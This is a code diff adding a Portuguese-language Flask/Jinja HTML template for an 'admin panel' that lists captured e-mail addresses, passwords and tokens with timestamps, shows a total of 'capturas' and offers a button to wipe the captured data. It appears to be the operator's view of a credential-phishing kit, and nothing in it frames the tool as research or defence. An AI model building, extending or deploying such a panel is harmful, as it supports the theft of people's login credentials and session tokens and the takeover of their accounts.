@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <title>Painel Administrativo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/login.css') }}">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    .panel {
+      max-width: 900px;
+      margin: 50px auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    }
+    h1 {
+      color: #333;
+      text-align: center;
+    }
+    a.logout {
+      display: inline-block;
+      margin-bottom: 20px;
+      padding: 8px 15px;
+      background: #c0392b;
+      color: white;
+      border-radius: 5px;
+      text-decoration: none;
+    }
+    a.logout:hover {
+      background: #e74c3c;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 15px;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px;
+      text-align: left;
+      font-size: 14px;
+      word-break: break-word;
+    }
+    th {
+      background-color: #f2f2f2;
+      color: #333;
+    }
+    tr:nth-child(even){
+      background-color: #fafafa;
+    }
+    form.limpar-form {
+      text-align: center;
+      margin: 15px 0;
+    }
+    form.limpar-form button {
+      background: #c0392b;
+      color: white;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    form.limpar-form button:hover {
+      background: #e74c3c;
+    }
+    p.total-capturas {
+      font-weight: bold;
+      font-size: 16px;
+      text-align: center;
+      margin-top: 10px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="panel">
+    <h1>Painel Administrativo</h1>
+
+    <a class="logout" href="{{ url_for('logout') }}">Sair</a>
+
+    <p class="total-capturas">Total de capturas: {{ total_capturas }}</p>
+
+    <form method="post" class="limpar-form">
+      <button type="submit" name="limpar" onclick="return confirm('Tem certeza que deseja limpar todos os dados capturados?');">
+        Limpar dados capturados
+      </button>
+    </form>
+
+    {% if acessos %}
+    <table>
+      <thead>
+        <tr>
+          <th>E-mail</th>
+          <th>Senha</th>
+          <th>Token</th>
+          <th>Data/Hora</th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for acesso in acessos %}
+        <tr>
+          <td>{{ acesso[0] }}</td>
+          <td>{{ acesso[1] }}</td>
+          <td>{{ acesso[2] }}</td>
+          <td>{{ acesso[3] }}</td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+    {% else %}
+    <p>Nenhum dado capturado.</p>
+    {% endif %}
+  </div>
+</body>
+</html>
